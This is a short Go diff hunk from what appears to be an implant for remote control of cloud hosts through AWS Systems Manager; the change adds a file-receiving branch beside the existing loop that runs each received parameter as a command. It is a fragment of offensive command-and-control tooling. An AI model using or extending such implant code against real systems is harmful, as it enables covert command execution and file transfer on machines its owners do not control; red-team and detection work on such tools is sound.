@@ -38,11 +38,17 @@ func main() {
 			json.Unmarshal([]byte(m.Payload), &payload)
 			jsonutil.Marshal(payload)
 			cmdid := payload.CommandID
-			for _, c := range payload.Parameters {
-				str := fmt.Sprintf("%v", c)
-				str = strings.TrimSuffix(str, "]")
-				str = implantutil.TrimFirstRune(str)
-				implantrun.RunCommand(str, cmdid, tokens, managedInstanceID, instanceRegion)
+			if payload.OutputS3KeyPrefix != "" {
+				awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
+				implantutil.RecieveFile(payload)
+
+			} else {
+				for _, c := range payload.Parameters {
+					str := fmt.Sprintf("%v", c)
+					str = strings.TrimSuffix(str, "]")
+					str = implantutil.TrimFirstRune(str)
+					implantrun.RunCommand(str, cmdid, tokens, managedInstanceID, instanceRegion)
+				}
 			}
 		}
 	}
